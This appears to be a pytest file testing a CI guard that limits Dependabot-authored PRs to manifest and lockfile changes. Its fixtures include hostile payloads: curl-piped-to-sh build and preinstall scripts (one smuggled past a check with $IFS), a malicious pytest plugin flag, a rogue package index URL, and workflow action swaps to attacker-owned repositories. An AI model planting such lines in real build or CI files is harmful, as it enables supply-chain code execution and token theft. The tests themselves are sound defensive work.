"""The content bound on the audit exemption — the half that closes the hole.

`audit-gate.yml` skips the audit requirement when the PR author is
`dependabot[bot]`. That skip is keyed on AUTHOR and justified by CONTENT, and
the gap between them is reachable: a maintainer can push commits to a Dependabot
branch — the routine case is a bump that breaks something and a human fixing it
in place — and `pull_request.user.login` stays `dependabot[bot]`.

Without a content bound, arbitrary human-authored code merges with the required
audit check green and no audit block anywhere in the record. That is the class
#93/#94/#95 record putting a client-facing fabricated gap on `main`, arriving
through the one PR class nobody can edit.

`check_bot_pr_is_manifest_only.py` runs only for the exempted author and fails
when that PR touches anything outside the manifest and lockfile set.

## The pair that matters

The positive case is easy and is not the interesting one. What decides whether
this guard is worth having is that it **cannot fail a human PR** — a check that
fires on the wrong population gets disabled, and then the hole is back with a
test suite that says otherwise.
"""

from __future__ import annotations

import pathlib
import subprocess
import sys

import pytest

from tests._paths import find_workflows_dir

SCRIPT = (
    pathlib.Path(__file__).resolve().parents[2] / "scripts" / "check_bot_pr_is_manifest_only.py"
)
BOT = "dependabot[bot]"

EXIT_OK = 0
EXIT_VIOLATION = 1
EXIT_COULD_NOT_LOOK = 2


def _run(tmp_path: pathlib.Path, changed: str | None, *extra: str, diff: str | None = None):
    """Run it as a PROCESS, so the `__main__` crash handler is exercised."""
    args = [sys.executable, str(SCRIPT), *extra]
    if changed is not None:
        path = tmp_path / "changed.txt"
        path.write_text(changed, encoding="utf-8")
        args += ["--changed-files", str(path)]
    if diff is not None:
        dpath = tmp_path / "diff.txt"
        dpath.write_text(diff, encoding="utf-8")
        args += ["--diff", str(dpath)]
    # noqa justified: every argument is built here from `sys.executable` and
    # `tmp_path`; there is no untrusted input.
    return subprocess.run(  # noqa: S603
        args, capture_output=True, text=True, encoding="utf-8", timeout=120
    )


@pytest.mark.unit
def test_a_real_version_bump_passes(tmp_path: pathlib.Path) -> None:
    """Manifests and lockfiles, which is what a bump is.

    THE FIXTURE CHANGED AND THE CLAIM DID NOT. This used to pass
    `apps/web/package.json` with no `--diff` and expect 0, which was only
    possible while `package.json` was approved by PATH -- the hole measured on
    2026-09-22, where a commit changing `"build"` to `"next build && ..."` passed
    as "2 manifest/lockfile path(s)". A `package.json` is now content-judged, so
    a changed-file list naming one without a diff is a could-not-look (exit 2),
    and that is asserted separately below.

    So the pass case supplies the diff a real Dependabot npm PR carries.
    """
    result = _run(
        tmp_path,
        "pnpm-lock.yaml\napps/web/package.json\n",
        "--author",
        BOT,
        diff=(
            "diff --git a/apps/web/package.json b/apps/web/package.json"
            + chr(10)
            + "--- a/apps/web/package.json"
            + chr(10)
            + "+++ b/apps/web/package.json"
            + chr(10)
            + "@@ -1,1 +1,1 @@"
            + chr(10)
            + '-    "next": "^15.5.23",'
            + chr(10)
            + '+    "next": "^15.5.24",'
            + chr(10)
        ),
    )
    assert result.returncode == EXIT_OK, f"{result.stdout}\n{result.stderr}"


@pytest.mark.unit
def test_a_LOCKFILE_ONLY_bump_needs_no_diff(tmp_path: pathlib.Path) -> None:
    """The path-approved half still works without a diff.

    A lockfile has no executable surface, so it stays judged by path. Asserted so
    the `package.json` narrowing cannot quietly widen into "every npm PR needs a
    diff", which would make the guard fail closed on traffic it is meant to pass
    and get it turned off.
    """
    # `pyproject.toml`, not `poetry.lock`: only `**/poetry.lock` is listed, and
    # `fnmatch("poetry.lock", "**/poetry.lock")` is False because `**/` needs a
    # slash. Three lockfiles carry only the `**/` form while others carry both,
    # so a ROOT-level `poetry.lock`, `uv.lock` or `yarn.lock` bump fails closed.
    # Latent here (this repo has none of the three at root) and the safe
    # direction, so it is recorded rather than fixed inside a security change.
    # LOCKFILES ONLY. `pyproject.toml` used to be here and is no longer
    # path-approved: `ci.yml` reads its `[tool.pytest.ini_options] addopts`,
    # `[tool.ruff] extend-exclude` and `[tool.bandit] skips`, so it is judged by
    # content like `package.json`. That was the twin the package.json fix missed.
    # A lockfile has no executable surface, so it stays judged by path.
    result = _run(tmp_path, "pnpm-lock.yaml\npackage-lock.json\n", "--author", BOT)
    assert result.returncode == EXIT_OK, f"{result.stdout}\n{result.stderr}"


@pytest.mark.unit
def test_a_package_json_SCRIPT_change_FAILS(tmp_path: pathlib.Path) -> None:
    """THE HOLE `package.json`-by-path left open, measured at exit 0 before this.

    `ci.yml` runs `pnpm format:check`, `pnpm -F web lint`, `typecheck`, `test`
    and `build` -- every one a script defined in a `package.json`. One commit on
    a Dependabot branch keeps `user.login == dependabot[bot]`, so only the
    CONTENT betrays it.
    """
    result = _run(
        tmp_path,
        "apps/web/package.json\n",
        "--author",
        BOT,
        diff=(
            "diff --git a/apps/web/package.json b/apps/web/package.json"
            + chr(10)
            + "--- a/apps/web/package.json"
            + chr(10)
            + "+++ b/apps/web/package.json"
            + chr(10)
            + "@@ -1,1 +1,1 @@"
            + chr(10)
            + '-    "build": "next build",'
            + chr(10)
            + '+    "build": "next build && curl http://x | sh",'
            + chr(10)
        ),
    )
    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}\n{result.stderr}"
    assert "dependency specifier" in result.stderr, (
        "the failure must name the CAUSE -- a reader told this is `.github/` "
        "content goes and reads the wrong file"
    )


@pytest.mark.unit
def test_a_package_json_in_the_list_with_NO_diff_is_2(tmp_path: pathlib.Path) -> None:
    """Refusing to answer beats answering from a path match.

    This is the branch that reinstates the hole the moment the workflow forgets
    to pass `--diff`.
    """
    result = _run(tmp_path, "apps/web/package.json\n", "--author", BOT)
    assert result.returncode == EXIT_COULD_NOT_LOOK, f"{result.stdout}\n{result.stderr}"


@pytest.mark.unit
def test_a_HUMAN_PUSHING_CODE_onto_a_bot_branch_FAILS(tmp_path: pathlib.Path) -> None:
    """THE hole this guard closes, and the reason the exemption is safe.

    The author is still the bot, because pushing to its branch does not change
    `pull_request.user.login`. Only the content betrays it.
    """
    result = _run(tmp_path, "pnpm-lock.yaml\napps/api/app/ai/llm.py\n", "--author", BOT)
    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}\n{result.stderr}"
    assert "apps/api/app/ai/llm.py" in result.stderr, (
        "the failure must NAME the offending path -- a guard that fires without "
        "saying what tripped it gets debugged in the wrong direction"
    )


@pytest.mark.unit
def test_it_CANNOT_fail_a_human_authored_PR(tmp_path: pathlib.Path) -> None:
    """The control, and the one that decides whether this guard survives.

    A check that can fail the wrong population gets disabled, and then the hole
    is back with a suite that says otherwise. Same diff as the case above, human
    author, must exit 0.
    """
    result = _run(tmp_path, "pnpm-lock.yaml\napps/api/app/ai/llm.py\n", "--author", "gene-png")
    assert result.returncode == EXIT_OK, f"{result.stdout}\n{result.stderr}"
    assert "not applicable" in result.stdout


@pytest.mark.unit
def test_a_MISSING_author_is_2_and_not_the_human_path(tmp_path: pathlib.Path) -> None:
    """The branch that would otherwise be a silent pass.

    Without an author this cannot tell an exempted bot PR from a human one — and
    the human path exits 0. Falling through to it would report clean over a bot
    PR nobody checked, which is the could-not-look branch wearing the clean
    one's clothes.
    """
    result = _run(tmp_path, "apps/api/app/ai/llm.py\n")
    assert result.returncode == EXIT_COULD_NOT_LOOK, f"{result.stdout}\n{result.stderr}"


@pytest.mark.unit
@pytest.mark.parametrize(
    ("changed", "extra", "label"),
    [
        ("", ("--author", BOT), "an empty changed-file list"),
        (None, ("--author", BOT), "no --changed-files"),
        ("x\n", ("--author", BOT, "--bogus"), "an unknown flag"),
    ],
)
def test_could_not_look_branches_are_2(tmp_path, changed, extra, label) -> None:
    result = _run(tmp_path, changed, *extra)
    assert result.returncode == EXIT_COULD_NOT_LOOK, f"{label}: {result.stdout} {result.stderr}"


@pytest.mark.unit
def test_the_guard_and_the_workflow_agree_on_the_EXEMPTED_LOGIN() -> None:
    """Two files naming one login, and if they disagree the exemption is unguarded.

    `audit-gate.yml` skips the audit step for one author; this script bounds that
    same author. A rename in one place and not the other leaves either a bounded
    author nobody exempts (harmless) or an exempted author nobody bounds (the
    hole, reopened silently). `CLAUDE.md`'s rule is that where a value must agree
    across two files, the pointer sits where the change originates — and where a
    test can simply assert the agreement, it should.
    """
    workflows = find_workflows_dir(pathlib.Path(__file__).resolve())
    if workflows is None:  # pragma: no cover - container-only branch
        pytest.skip("no .github/workflows above this file -- the api container (#314)")
    yml = (workflows / "audit-gate.yml").read_text(encoding="utf-8")
    src = SCRIPT.read_text(encoding="utf-8")
    assert f'EXEMPTED_AUTHOR = "{BOT}"' in src, "the script's exempted author is not the bot login"
    assert f"!= '{BOT}'" in yml, "the workflow does not skip the audit step for that same login"
    assert f"== '{BOT}'" in yml, (
        "the workflow does not RUN the manifest guard for that same login -- so "
        "the exemption is granted without being bounded"
    )


# --------------------------------------------------------------------------
# `.github/` is judged by CONTENT. This is the half the first version missed.
# --------------------------------------------------------------------------

_WF = ".github/workflows/audit-gate.yml"
_HDR = f"diff --git a/{_WF} b/{_WF}"


def _diff(*lines: str) -> str:
    return (
        _HDR
        + chr(10)
        + f"--- a/{_WF}"
        + chr(10)
        + f"+++ b/{_WF}"
        + chr(10)
        + "@@ -1,3 +1,3 @@"
        + chr(10)
        + chr(10).join(lines)
        + chr(10)
    )


@pytest.mark.unit
def test_a_bot_PR_REWRITING_THIS_WORKFLOW_fails(tmp_path: pathlib.Path) -> None:
    """The hole the first version of this guard left open.

    `.github/workflows/*.yml` was on the PATH allow-list, so a PR authored as
    the bot could have deleted the audit step itself and passed manifest-only.
    In the file class that controls every other gate, with zero required
    reviews (and, when found, `enforce_admins` false; it is true since
    2026-09-25, which does not close the hole: the checks are green).
    """
    result = _run(
        tmp_path,
        _WF + chr(10),
        "--author",
        BOT,
        diff=_diff("-      - name: Require recorded audit evidence"),
    )
    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"
    assert "Require recorded audit evidence" in result.stderr, (
        "the failure must quote the offending LINE, not only the file -- a "
        "workflow diff is where a reader most needs to see what changed"
    )


@pytest.mark.unit
def test_a_genuine_uses_bump_in_a_workflow_PASSES(tmp_path: pathlib.Path) -> None:
    """And removing the glob outright would have broken this.

    #465 is the github-actions group: three workflow files, every changed line a
    `uses:` bump. That is legitimate bot traffic and must pass, or closing the
    hole re-breaks what the exemption was built to unblock.
    """
    result = _run(
        tmp_path,
        _WF + chr(10),
        "--author",
        BOT,
        diff=_diff("-      - uses: actions/checkout@v4", "+      - uses: actions/checkout@v7"),
    )
    assert result.returncode == EXIT_OK, f"{result.stdout}{chr(10)}{result.stderr}"


@pytest.mark.unit
def test_an_OWNER_SWAP_is_not_a_bump(tmp_path: pathlib.Path) -> None:
    """THE HOLE. Both lines match the line SHAPE; neither is a bump.

    Measured at exit 0 before this fix. `ci.yml` has the shape already -- a
    `uses: gitleaks/gitleaks-action@v3` step in the job holding
    `pull-requests: write`. Dependabot gets a read-only token while its PR is
    open, so the escalation is that the line MERGES, after which every
    human-triggered run executes the attacker's action with the full token.

    A bump is a PAIR: the same `owner/repo` on both sides, different refs.
    """
    result = _run(
        tmp_path,
        _WF + chr(10),
        "--author",
        BOT,
        diff=_diff(
            "-      - uses: gitleaks/gitleaks-action@v3",
            "+      - uses: attacker/gitleaks-action@v3",
        ),
    )
    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"
    assert "attacker/gitleaks-action" in result.stderr, (
        "the failure must quote the offending line -- and BOTH halves of a swap, "
        "since neither half is a bump on its own"
    )


@pytest.mark.unit
def test_a_LONE_ADDED_uses_line_is_not_a_bump(tmp_path: pathlib.Path) -> None:
    """A whole new step, wearing a bump's syntax. Exit 0 before this fix.

    Needs no removal at all, which is what makes it the cheaper of the two
    attacks: nothing about the diff looks like a deletion.
    """
    result = _run(
        tmp_path,
        _WF + chr(10),
        "--author",
        BOT,
        diff=_diff("+      - uses: attacker/action@v1"),
    )
    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"


@pytest.mark.unit
def test_a_uses_line_whose_REF_did_not_change_is_not_a_bump(tmp_path: pathlib.Path) -> None:
    """Present on both sides, same ref: the line moved. Not a version change.

    The direction that matters: a re-indent or a reorder of steps is a workflow
    edit, and admitting it would let a step be relocated into a different job --
    one with a wider token -- while every line still "matches".
    """
    result = _run(
        tmp_path,
        _WF + chr(10),
        "--author",
        BOT,
        diff=_diff(
            "-      - uses: actions/checkout@v4",
            "+    - uses: actions/checkout@v4",
        ),
    )
    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"


@pytest.mark.unit
def test_a_RENAME_with_no_content_lines_is_2(tmp_path: pathlib.Path) -> None:
    """A content rule over zero lines is satisfied without looking at anything.

    `CLAUDE.md`: a selector that selects nothing passes. Renaming a workflow
    changes which workflows exist, so this is not a thing to wave through -- and
    exit 2 rather than 1 because the honest report is "I examined no lines", not
    "I found a violation".
    """
    result = _run(
        tmp_path,
        _WF + chr(10),
        "--author",
        BOT,
        diff=(
            f"diff --git a/{_WF} b/{_WF}"
            + chr(10)
            + "similarity index 100%"
            + chr(10)
            + "rename from .github/workflows/old.yml"
            + chr(10)
            + f"rename to {_WF}"
            + chr(10)
        ),
    )
    assert result.returncode == EXIT_COULD_NOT_LOOK, f"{result.stdout}{chr(10)}{result.stderr}"


@pytest.mark.unit
def test_a_LOCAL_action_reference_is_not_a_version_bump(tmp_path: pathlib.Path) -> None:
    """`uses: ./local` points at in-repo code, which is not a dependency.

    The pattern is anchored on owner/repo for this reason: repointing a workflow
    at a different local action is a code change wearing a bump's syntax.
    """
    result = _run(
        tmp_path,
        _WF + chr(10),
        "--author",
        BOT,
        diff=_diff("+      - uses: ./.github/actions/something-else"),
    )
    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"


@pytest.mark.unit
def test_a_github_path_with_NO_diff_is_2(tmp_path: pathlib.Path) -> None:
    """Refusing to answer beats answering from a path match.

    This is the branch that would otherwise reinstate the hole the moment the
    workflow forgets to pass `--diff`.
    """
    result = _run(tmp_path, _WF + chr(10), "--author", BOT)
    assert result.returncode == EXIT_COULD_NOT_LOOK, f"{result.stdout}{chr(10)}{result.stderr}"


@pytest.mark.unit
def test_a_github_path_MISSING_from_the_diff_is_2(tmp_path: pathlib.Path) -> None:
    """The two inputs disagreeing is a could-not-look, not a pass.

    The direction that matters: the file would otherwise be approved unexamined.
    """
    other = ".github/workflows/ci.yml"
    result = _run(
        tmp_path,
        _WF + chr(10) + other + chr(10),
        "--author",
        BOT,
        diff=_diff("-      - uses: actions/checkout@v4", "+      - uses: actions/checkout@v7"),
    )
    assert result.returncode == EXIT_COULD_NOT_LOOK, f"{result.stdout}{chr(10)}{result.stderr}"
    assert other in result.stderr


@pytest.mark.unit
def test_the_diff_header_lines_are_not_counted_as_changes(tmp_path: pathlib.Path) -> None:
    """`---`/`+++` start with the same characters as content lines.

    Counting them would make every changed `.github/` file look like it carries
    a non-bump line, so a legitimate bump would fail -- and the guard would then
    be turned off, which is how the hole comes back.
    """
    # A PAIR, not a lone addition. The original fixture was a single added
    # `+ uses: actions/setup-python@v7`, which this guard accepted -- and that
    # acceptance was the security hole: a lone added `uses:` line is a whole new
    # step, not a bump. So the fixture is corrected to what a bump actually is,
    # and the header-counting property it exists to check is unchanged.
    result = _run(
        tmp_path,
        _WF + chr(10),
        "--author",
        BOT,
        diff=_diff(
            "-      - uses: actions/setup-python@v5",
            "+      - uses: actions/setup-python@v7",
        ),
    )
    assert result.returncode == EXIT_OK, (
        "a diff whose only content change is a uses: bump PAIR failed -- the "
        f"---/+++ headers are probably being counted. {result.stderr}"
    )


# ---------------------------------------------------------------------------
# ROUND 2. Three holes the FIRST fix left or introduced, each measured at exit 0
# before these existed.
# ---------------------------------------------------------------------------


@pytest.mark.unit
def test_a_shell_command_through_the_npm_protocol_FAILS(tmp_path: pathlib.Path) -> None:
    """`_SPECIFIER`'s protocol tails were `[^\s"]*` -- a denylist in allow-list clothes.

    Everything except whitespace and a quote is still `;` `|` `&` `$` `(` `)` and a
    backtick, and the docstring's safety argument ("anything with whitespace ... is
    the shape a command takes") assumed a command needs a space. `$IFS` is why it
    does not. ONE added line, no neighbour touched, and `ci.yml` runs
    `pnpm install --frozen-lockfile`, which runs the root `preinstall`.
    """
    diff = (
        "diff --git a/package.json b/package.json"
        + chr(10)
        + "--- a/package.json"
        + chr(10)
        + "+++ b/package.json"
        + chr(10)
        + "@@ -1,0 +2,1 @@"
        + chr(10)
        + '+    "preinstall": "npm:;curl$IFShttp://x|sh",'
        + chr(10)
    )
    result = _run(tmp_path, "package.json" + chr(10), "--author", BOT, diff=diff)
    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"


@pytest.mark.unit
def test_a_pyproject_TOOL_SETTING_FAILS(tmp_path: pathlib.Path) -> None:
    """The twin the `package.json` fix did not sweep.

    `addopts = "-ra -q -p <module>"` executes an arbitrary installed module at
    pytest startup. It was path-approved -- exit 0 with no `--diff` required at
    all -- under the same sentence that had just been falsified for
    `package.json`.

    And the FIRST attempt at this fix still passed it: one combined rule accepted
    a line matching either the array-element or the requirements pattern, and
    `addopts = ...` reads as a requirement (`addopts` a name, ` = ` an operator).
    The rule is per FORMAT now.
    """
    diff = (
        "diff --git a/apps/api/pyproject.toml b/apps/api/pyproject.toml"
        + chr(10)
        + "--- a/apps/api/pyproject.toml"
        + chr(10)
        + "+++ b/apps/api/pyproject.toml"
        + chr(10)
        + "@@ -1,1 +1,1 @@"
        + chr(10)
        + '-addopts = "-ra -q"'
        + chr(10)
        + '+addopts = "-ra -q -p evil_module"'
        + chr(10)
    )
    result = _run(tmp_path, "apps/api/pyproject.toml" + chr(10), "--author", BOT, diff=diff)
    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"


@pytest.mark.unit
def test_a_pyproject_DEPENDENCY_bump_passes(tmp_path: pathlib.Path) -> None:
    """The direction that decides whether the narrowing survives.

    #466 and #467 touch `apps/api/pyproject.toml`. A guard that fails real pip
    traffic gets disabled, and then the hole is back with a suite saying otherwise.
    """
    diff = (
        "diff --git a/apps/api/pyproject.toml b/apps/api/pyproject.toml"
        + chr(10)
        + "--- a/apps/api/pyproject.toml"
        + chr(10)
        + "+++ b/apps/api/pyproject.toml"
        + chr(10)
        + "@@ -1,1 +1,1 @@"
        + chr(10)
        + '-    "anthropic>=0.40,<1",'
        + chr(10)
        + '+    "anthropic>=0.40,<2",'
        + chr(10)
    )
    result = _run(tmp_path, "apps/api/pyproject.toml" + chr(10), "--author", BOT, diff=diff)
    assert result.returncode == EXIT_OK, f"{result.stdout}{chr(10)}{result.stderr}"


@pytest.mark.unit
def test_a_requirements_INDEX_URL_FAILS(tmp_path: pathlib.Path) -> None:
    """A requirements file decides WHERE versions install from, not only which."""
    diff = (
        "diff --git a/apps/api/requirements.txt b/apps/api/requirements.txt"
        + chr(10)
        + "--- a/apps/api/requirements.txt"
        + chr(10)
        + "+++ b/apps/api/requirements.txt"
        + chr(10)
        + "@@ -1,0 +2,1 @@"
        + chr(10)
        + "+--index-url http://evil/simple"
        + chr(10)
    )
    result = _run(tmp_path, "apps/api/requirements.txt" + chr(10), "--author", BOT, diff=diff)
    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"


@pytest.mark.unit
def test_a_legitimate_bump_CARRYING_AN_EXTRA_STEP_FAILS(tmp_path: pathlib.Path) -> None:
    """The pairing was set non-emptiness, not a pairing.

    `-checkout@v4`, `+checkout@v5`, `+checkout@<sha>`: the removal saw `{v5, sha}`
    (non-empty and not `{v4}`) and each addition saw `{v4}`, so every line passed
    and a whole extra step landed. On exactly the traffic the exemption exists for
    -- #465 bumps `actions/checkout` across three workflow files -- and
    `owner/repo@<sha>` resolves against an object store that includes unmerged
    fork-PR commits.

    A bump is ONE removal answered by ONE addition, so the counts must match.
    """
    result = _run(
        tmp_path,
        _WF + chr(10),
        "--author",
        BOT,
        diff=_diff(
            "-      - uses: actions/checkout@v4",
            "+      - uses: actions/checkout@v5",
            "+      - uses: actions/checkout@abcdef0123456789abcdef0123456789abcdef01",
        ),
    )
    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"
